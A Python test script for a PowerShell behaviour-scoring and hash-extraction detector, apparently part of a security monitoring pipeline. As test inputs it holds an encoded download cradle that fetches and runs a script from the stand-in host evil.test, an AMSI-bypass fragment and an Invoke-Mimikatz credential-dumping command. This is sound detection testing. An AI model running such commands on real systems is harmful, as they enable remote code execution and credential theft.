import base64
import behavior

behavior.YARA_RULES_PATH = "/tmp/re_test"   # point at rules.yar for local test


def enc(ps):
    return base64.b64encode(ps.encode("utf-16-le")).decode()


def check(name, got, expect):
    ok = got == expect
    print(f"[{'PASS' if ok else 'FAIL'}] {name}: got={got} expect={expect}")
    return ok


results = []

# 1) Benign encoded — the user's REAL event (whoami; hostname)
cl1 = ('"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
       '-noprofile -encodedcommand dwBoAG8AYQBtAGkAOwAgAGgAbwBzAHQAbgBhAG0AZQA=')
b1 = behavior.compute_behavior(cl1)
print("  decoded1:", repr(b1["decoded_preview"]), "matches:", b1["yara_matches"])
results.append(check("benign-encoded score", b1["behavior_score"], 50))
results.append(check("benign-encoded floor", behavior.behavior_floor(b1["behavior_score"]), 50))

# 2) Malicious download cradle, encoded + hidden flags
cl2 = "powershell.exe -nop -w hidden -enc " + enc(
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')")
b2 = behavior.compute_behavior(cl2)
print("  matches2:", b2["yara_matches"], "techniques:", b2["techniques"])
results.append(check("cradle score", b2["behavior_score"], 75))
results.append(check("cradle floor", behavior.behavior_floor(b2["behavior_score"]), 75))

# 3) AMSI bypass (critical)
cl3 = "powershell -enc " + enc(
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
b3 = behavior.compute_behavior(cl3)
results.append(check("amsi score", b3["behavior_score"], 90))
results.append(check("amsi floor", behavior.behavior_floor(b3["behavior_score"]), 90))

# 4) Mimikatz
cl4 = "powershell -enc " + enc("Invoke-Mimikatz -DumpCreds")
b4 = behavior.compute_behavior(cl4)
results.append(check("mimikatz score", b4["behavior_score"], 95))
results.append(check("mimikatz floor", behavior.behavior_floor(b4["behavior_score"]), 90))

# 5) Non-encoded benign command — must stay 0 (preserve existing behavior)
b5 = behavior.compute_behavior('"C:\\Windows\\notepad.exe"')
results.append(check("benign-plain score", b5["behavior_score"], 0))
results.append(check("benign-plain floor", behavior.behavior_floor(b5["behavior_score"]), 0))

# 6) sha256 extraction from real Sysmon eventchannel combined hashes
f6 = {"data": {"win": {"eventdata": {"hashes":
      "MD5=A97E6573B97B44C96122BFA543A82EA1,"
      "SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,"
      "IMPHASH=AFACF6DC9041114B198160AAB4D0AE77"}}}}
results.append(check("sha256 eventchannel", behavior._extract_sha256(f6),
                     "0ff6f2c94bc7e2833a5f7e16de1622e5dba70396f31c7d5f56381870317e8c46"))

# 7) sha256 extraction from syslog-style split field
f7 = {"data": {"hash_sha256":
      "ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789"}}
results.append(check("sha256 syslog", behavior._extract_sha256(f7),
                     "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"))

# 8) Unsubstituted Shuffle var must NOT be treated as a hash
f8 = {"data": {"hash_sha256": "$exec.all_fields.data.hash_sha256"}}
results.append(check("sha256 unsubstituted", behavior._extract_sha256(f8), ""))

# 9) Non-encoded but suspicious flags (legit-ish admin script) → score 40, NO floor
b9 = behavior.compute_behavior('powershell.exe -noprofile -w hidden -File C:\\setup.ps1')
print("  matches9:", b9["yara_matches"])
results.append(check("flags-only score", b9["behavior_score"], 40))
results.append(check("flags-only floor (no forced case)", behavior.behavior_floor(b9["behavior_score"]), 0))

print(f"\n{sum(results)}/{len(results)} PASS")
exit(0 if all(results) else 1)
